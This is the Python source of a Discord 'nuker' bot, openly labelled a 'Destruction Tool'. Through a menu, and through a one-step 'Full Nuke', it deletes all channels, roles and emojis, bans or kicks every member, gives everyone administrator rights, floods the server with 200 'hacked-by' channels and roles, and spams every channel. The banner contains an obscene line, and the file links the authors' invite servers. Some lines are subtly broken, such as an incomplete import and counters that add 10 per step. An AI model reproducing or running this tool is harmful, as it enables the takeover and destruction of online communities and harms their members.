)
#=====by kyoja=====
import discord
from discord.ext import 
import asyncio
import time
from colorama import Fore, Style, init

init(autoreset=True)

TOKEN = input(Fore.RED + "Enter your Bot Token 🔑 :  " + Style.RESET_ALL)
GUILD_ID = int(input(Fore.RED + "Enter your Server ID 🆔 : " + Style.RESET_ALL))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def show_banner():
    
    print(fore.RED + Style.BRIGHT + """\n


██╗  ██╗██╗██╗     ██╗     ███████╗██████╗  ██████╗     ██╗ ██╗   ██╗██╗░█████╗   ███╗
██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗██╔════╝  ██████████╗░██╔╝██║██╔══██╗ ████║
█████═╝ ██║██║     ██║     █████╗  ██████╔╝╚█████╗   ╚═██╔═██╔═╝██╔╝ ██║╚█████╔╝██╔██║
██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗ ╚═══██╗  ██████████╗███████║██╔══██╗╚═╝██║
██║ ╚██╗██║███████╗███████╗███████╗██║  ██║██████╔╝  ╚██╔═██╔══╝╚════██║╚█████╔╝███████╗
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝    ╚═╝ ╚═╝        ╚═╝ ╚════╝ ╚══════╝


                  
""" + Style.RESET_ALL)
    print(Fore.RED + "Nuker#Da404rk v1" + Style.RESET_ALL)
    print(Fore.RED + "https://discord.gg/jsmcJYyUXy" + Style.RESET_ALL)
    print()

def show_menu():
    print(Fore.WHITE + "─" * 50)
    print(Fore.LIGHTRED_EX + " " + Fore.LIGHTWHITE_EX + "fuck the kids | made by Mr.Angel" + Fore.LIGHTRED_EX + " ")
    print(Fore.WHITE + "─" * 50)
    print(Fore.RED + "[1]" + Fore.LIGHTWHITE_EX + " Delete All Channels")
    print(Fore.RED + "[2]" + Fore.LIGHTWHITE_EX + " Create Channels")
    print(Fore.RED + "[3]" + Fore.LIGHTWHITE_EX + " Nuker#Da404rk (Full Nuke)")
    print(Fore.RED + "[4]" + Fore.LIGHTWHITE_EX + " Rename All Channels")
    print(Fore.RED + "[5]" + Fore.LIGHTWHITE_EX + " Create Roles")
    print(Fore.RED + "[6]" + Fore.LIGHTWHITE_EX + " Delete All Roles")
    print(Fore.RED + "[7]" + Fore.LIGHTWHITE_EX + " Admin to everyone")
    print(Fore.RED + "[8]" + Fore.LIGHTWHITE_EX + " Delete All Emojis")
    print(Fore.RED + "[9]" + Fore.LIGHTWHITE_EX + " Ban All Members")
    print(Fore.RED + "[10]" + Fore.LIGHTWHITE_EX + "Kick All Members")
    print(Fore.RED + "[11]" + Fore.LIGHTWHITE_EX + "Change Server Name")
    print(Fore.RED + "[12]" + Fore.LIGHTWHITE_EX + "Spam Message (All Channels)")
    print(Fore.RED + "[a]" + Fore.LIGHTWHITE_EX + " About Us")
    print(Fore.RED + "[x]" + Fore.LIGHTWHITE_EX + " Exit")
    print(Fore.WHITE + "─" * 50)

async def progress_bar(current, total, start_time, action="Processing"):
    elapsed = int(time.time() - start_time)
    mins, secs = divmod(elapsed, 60)
    time_str = f"{mins:02d}:{secs:02d}"
    progress = (current / total) * 100 if total > 0 else 100
    print(f"\r{Fore.LIGHTBLUE_EX}{time_str} {Fore.RED}──▶ "
          f"{Fore.LIGHTGREEN_EX}{progress:.2f}% | {action} {current}/{total}",
          end="", flush=True)

async def delete_channels(guild):
    start_time = time.time()
    channels = list(guild.channels)
    total = len(channels)
    deleted = 0
    print(Fore.YELLOW + "\n[*] Deleting channels..." + Style.RESET_ALL)
    for ch in channels:
        try:
            await ch.delete()
            deleted += 10
        except:
            pass
        await progress_bar(deleted, total, start_time, "Deleting")
    print()

async def create_channels(guild, name=None, num=None):
    if name is None:
        name = input(Fore.RED + "Channel Name: " + Style.RESET_ALL)
    if num is None:
        num = int(input(Fore.RED + "Number of channels: " + Style.RESET_ALL))
    start_time = time.time()
    created = 0
    print(Fore.YELLOW + f"[*] Creating {num} channels..." + Style.RESET_ALL)
    for i in range(num):
        try:
            await guild.create_text_channel(f"{name}")
            created += 10
        except:
            pass
        await progress_bar(created, num, start_time, "Creating")
    print()

async def rename_channels(guild):
    base = input(Fore.RED + "New Channel Name: " + Style.RESET_ALL)
    start_time = time.time()
    channels = list(guild.channels)
    renamed = 0
    print(Fore.YELLOW + "[*] Renaming channels..." + Style.RESET_ALL)
    for i, ch in enumerate(channels):
        try:
            await ch.edit(name=f"{base}")
            renamed += 10
        except:
            pass
        await progress_bar(renamed, len(channels), start_time, "Renaming")
    print()
    
async def create_roles(guild, name=None, num=None):
    if name is None:
        name = input(Fore.RED + "Role Name: " + Style.RESET_ALL)
    if num is None:
        num = int(input(Fore.RED + "Number of roles: " + Style.RESET_ALL))
    start_time = time.time()
    created = 0
    for i in range(num):
        try:
            await guild.create_role(name=f"{name}")
            created += 1
        except:
            pass
        await progress_bar(created, num, start_time, "Creating Roles")
    print()

async def delete_roles(guild):
    start_time = time.time()
    roles = [r for r in guild.roles if r.name != "@everyone"]
    total = len(roles)
    deleted = 0
    print(Fore.YELLOW + "[*] Deleting roles..." + Style.RESET_ALL)
    for r in roles:
        try:
            await r.delete()
            deleted += 10
        except:
            pass
        await progress_bar(deleted, total, start_time, "Deleting")
    print()

async def everyone_admin(guild):
    print(Fore.YELLOW + "[*] Giving everyone Admin..." + Style.RESET_ALL)
    try:
        await guild.default_role.edit(permissions=discord.Permissions(administrator=True))
        print(f"{Fore.LIGHTGREEN_EX}[✓] Success!{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}[✗] Failed!{Style.RESET_ALL}")

async def delete_emojis(guild):
    start_time = time.time()
    emojis = list(guild.emojis)
    total = len(emojis)
    deleted = 0
    print(Fore.YELLOW + "[*] Deleting emojis..." + Style.RESET_ALL)
    for emoji in emojis:
        try:
            await emoji.delete()
            deleted += 10
        except:
            pass
        await progress_bar(deleted, total, start_time, "Deleting")
    print()

async def ban_all_members(guild):
    start_time = time.time()
    members = [m for m in guild.members if not m.bot and m != guild.owner]
    total = len(members)
    banned = 0
    print(Fore.YELLOW + "[*] Banning members..." + Style.RESET_ALL)
    for member in members:
        try:
            await member.ban(reason="Nuker#dr3aLnJrFEh")
            banned += 1
        except:
            pass
        await progress_bar(banned, total, start_time, "Banning")
    print()

async def kick_all_members(guild):
    start_time = time.time()
    members = [m for m in guild.members if not m.bot and m != guild.owner]
    total = len(members)
    kicked = 0
    print(Fore.YELLOW + "[*] Kicking members..." + Style.RESET_ALL)
    for member in members:
        try:
            await member.kick()
            kicked += 10
        except:
            pass
        await progress_bar(kicked, total, start_time, "Kicking")
    print()

async def change_server_name(guild, new_name=None):
    if new_name is None:
        new_name = input(Fore.RED + "New Server Name: " + Style.RESET_ALL)
    try:
        await guild.edit(name=new_name)
        print(Fore.LIGHTGREEN_EX + "[+] Server name changed.\n" + Style.RESET_ALL)
    except:
        print(Fore.RED + "[-] Failed to change server name.\n" + Style.RESET_ALL)

async def change_server_icon(guild):
    try:
        with open("icon.jpg", "rb") as f:
            icon = f.read()
        await guild.edit(icon=icon)
        print(Fore.LIGHTGREEN_EX + "[✓] Server icon changed to 'icon.jpg'." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Failed to change server icon: {e}" + Style.RESET_ALL)

async def about_us():
    print(Fore.CYAN + "\n" + "═" * 50)
    print(Fore.LIGHTWHITE_EX + " [ About dr3 aLnJrFEh ]")
    print(Fore.CYAN + "═" * 50)
    print(Fore.YELLOW + " • Tool Name : " + Fore.GREEN + "Nuker#Da404rk v1")
    print(Fore.YELLOW + " • Version : " + Fore.GREEN + "v1.0")
    print(Fore.YELLOW + " • Developer : " + Fore.GREEN + "kyoja")
    print(Fore.YELLOW + " • Contact : " + Fore.GREEN + "@p6jj")
    print(Fore.YELLOW + " • Description : " + Fore.GREEN + "Destruction Tool")
    print(Fore.CYAN + "═" * 50)
    input(Fore.LIGHTBLUE_EX + "\nPress Enter to return..." + Style.RESET_ALL)

async def spam_all_channels(guild):
    try:
        msg = input(Fore.RED + "Message to spam: " + Style.RESET_ALL)
        count = int(input(Fore.RED + "How many times in each channel?: " + Style.RESET_ALL))
        delay = float(input(Fore.RED + "Delay (seconds) between messages: " + Style.RESET_ALL))
        print(Fore.YELLOW + f"[*] Sending {count} messages in all channels..." + Style.RESET_ALL)
        for channel in guild.text_channels:
            try:
                for i in range(count):
                    await channel.send(msg)
                    await asyncio.sleep(delay)
                print(Fore.LIGHTGREEN_EX + f"[✓] Sent in {channel.name}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[✗] Can't send in {channel.name}: {e}" + Style.RESET_ALL)
        print(Fore.LIGHTGREEN_EX + "[✓] Spam finished in all channels." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Failed: {e}" + Style.RESET_ALL)

async def full_nuke(guild):
    print(Fore.LIGHTRED_EX + "\n[⚠] Starting Full Nuke: Nuker#Da404rk\n" + Style.RESET_ALL)
    try:
        await guild.edit(name="hacked by group#Killrs")
        print(Fore.LIGHTGREEN_EX + "[✓] Server name changed." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Failed to change name: {e}" + Style.RESET_ALL)
    await change_server_icon(guild)
    await delete_channels(guild)
    await delete_roles(guild)
    await delete_emojis(guild)
    await ban_all_members(guild)
    await create_channels(guild, "hacked-by-kyoja", 200)
    await create_roles(guild, "hacked-by-kyoja", 200)
    await spam_all_channels(guild)
    print(Fore.LIGHTRED_EX + " " + "═" * 60 + " ")
    print(Fore.LIGHTRED_EX + " [!] Server Nuked: hacked by group#kyoja")
    print(Fore.LIGHTRED_EX + " https://discord.gg/fpG36D7h | @its-Angel-t7b")
    print(Fore.LIGHTRED_EX + " " + "═" * 60 + " " + Style.RESET_ALL)

async def console_menu():
    await bot.wait_until_ready()
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print(Fore.RED + "[!] Invalid Server ID!" + Style.RESET_ALL)
        await bot.close()
        return
    while True:
        show_banner()
        print(Fore.LIGHTWHITE_EX + f"Server: {guild.name} ({guild.id})")
        show_menu()
        choice = input(Fore.LIGHTBLUE_EX + "\n> " + Style.RESET_ALL).strip()
        if choice == "1":
            await delete_channels(guild)
        elif choice == "2":
            await create_channels(guild)
        elif choice == "3":
            await full_nuke(guild)
        elif choice == "4":
            await rename_channels(guild)
        elif choice == "5":
            await create_roles(guild)
        elif choice == "6":
            await delete_roles(guild)
        elif choice == "7":
            await everyone_admin(guild)
        elif choice == "8":
            await delete_emojis(guild)
        elif choice == "9":
            await ban_all_members(guild)
        elif choice == "10":
            await kick_all_members(guild)
        elif choice == "11":
            await change_server_name(guild)
        elif choice == "12":
            await spam_all_channels(guild)
        elif choice.lower() == "a":
            await about_us()
        elif choice.lower() == "x":
            print(Fore.LIGHTGREEN_EX + "[+] Exiting... Goodbye!" + Style.RESET_ALL)
            await bot.close()
            break
        else:
            print(Fore.RED + "[!] Invalid option.\n" + Style.RESET_ALL)
            input(Fore.YELLOW + "Press Enter to continue..." + Style.RESET_ALL)

@bot.event
async def on_ready():
    print(Fore.LIGHTGREEN_EX + f"[+] Logged in as {bot.user}" + Style.RESET_ALL)
    await console_menu()

bot.run(TOKEN)
